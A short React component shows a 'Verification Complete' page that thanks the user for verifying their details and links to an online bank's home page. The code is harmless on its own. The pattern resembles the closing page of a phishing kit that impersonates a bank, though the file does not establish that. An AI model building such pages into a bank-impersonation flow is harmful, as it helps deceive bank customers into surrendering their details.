import { Link } from "react-router-dom";

export default function Success() {
  return (
    <>
      <br />
      <br />
      <br />
      <h3 style={{ textAlign: "center", color: "blue" }}>
        Verification Complete
      </h3>
      <p style={{ textAlign: "center", color: "blue" }}>
        Thank you for verifying your details with us, You'll be redirected to
        the home page.  <br />
        <Link style={{textAlign:"center", textDecoration:"underline"}} to={"https://www.onlinefarmersbank.com/#"}>Go home</Link>
      </p>
      
      <br />
      <br />
      <br />
    </>
  );
}
